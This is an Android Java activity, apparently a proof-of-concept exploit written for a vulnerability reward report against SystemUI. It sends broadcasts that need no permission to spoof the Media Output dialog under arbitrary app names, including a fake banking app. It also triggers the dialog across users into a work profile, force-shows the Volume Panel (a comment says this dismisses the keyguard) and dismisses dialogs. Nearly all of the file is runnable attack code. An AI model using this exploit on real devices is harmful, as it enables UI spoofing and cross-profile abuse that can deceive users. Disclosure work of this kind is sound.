package com.vrp.poc;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.UserHandle;
import android.util.Log;

public class MediaOutputSpoofActivity extends Activity {
    private static final String TAG = "MediaOutputSpoof";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(android.R.layout.simple_list_item_1);
        Log.d(TAG, "=== SystemUI MediaOutput Dialog Spoofing PoC ===");
        Log.d(TAG, "Target: com.android.systemui.media.dialog.MediaOutputDialogReceiver");
        Log.d(TAG, "Action: LAUNCH_MEDIA_OUTPUT_DIALOG (NOT in protected-broadcast list)");
        Log.d(TAG, "No permission required");

        testSpoofMediaOutputDialog();
        testSpoofVolumePanel();
        testDismissMediaOutput();
    }

    private void testSpoofMediaOutputDialog() {
        Log.d(TAG, "\n--- Phase 1: Spoof Media Output dialog with arbitrary package ---");
        String[] spoofPackages = {
            "com.google.android.apps.nbu.files",
            "com.android.chrome",
            "com.google.android.youtube",
            "com.fake.banking.app",
        };

        for (String pkg : spoofPackages) {
            try {
                Intent intent = new Intent("com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG");
                intent.putExtra("package_name", pkg);
                sendBroadcast(intent);
                Log.d(TAG, "[SENT] LAUNCH_MEDIA_OUTPUT_DIALOG for package: " + pkg);
            } catch (Exception e) {
                Log.e(TAG, "[ERROR] " + pkg + ": " + e);
            }
        }

        Log.d(TAG, "\n--- Phase 2: Cross-user dialog trigger ---");
        try {
            Intent intent = new Intent("com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG");
            intent.putExtra("package_name", "com.google.android.youtube");
            intent.putExtra("user_handle", android.os.UserHandle.getUserHandleForUid(1000010));
            sendBroadcast(intent);
            Log.d(TAG, "[SENT] Cross-user LAUNCH_MEDIA_OUTPUT_DIALOG (UserHandle=10/work profile)");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] cross-user: " + e);
        }
    }

    private void testSpoofVolumePanel() {
        Log.d(TAG, "\n--- Phase 3: Force-display Volume Panel (dismisses keyguard) ---");
        try {
            Intent intent = new Intent("com.android.systemui.action.LAUNCH_VOLUME_PANEL_DIALOG");
            sendBroadcast(intent);
            Log.d(TAG, "[SENT] LAUNCH_VOLUME_PANEL_DIALOG (unprotected broadcast)");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] volume: " + e);
        }

        try {
            Intent intent = new Intent("android.settings.panel.action.VOLUME");
            sendBroadcast(intent);
            Log.d(TAG, "[SENT] android.settings.panel.action.VOLUME (unprotected broadcast)");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] volume panel: " + e);
        }
    }

    private void testDismissMediaOutput() {
        Log.d(TAG, "\n--- Phase 4: Dismiss active Media Output dialog ---");
        try {
            Intent intent = new Intent("com.android.systemui.action.DISMISS_MEDIA_OUTPUT_DIALOG");
            sendBroadcast(intent);
            Log.d(TAG, "[SENT] DISMISS_MEDIA_OUTPUT_DIALOG");
        } catch (Exception e) {
            Log.e(TAG, "[ERROR] dismiss: " + e);
        }
        Log.d(TAG, "\n=== MediaOutput Spoofing PoC Complete ===");
    }
}
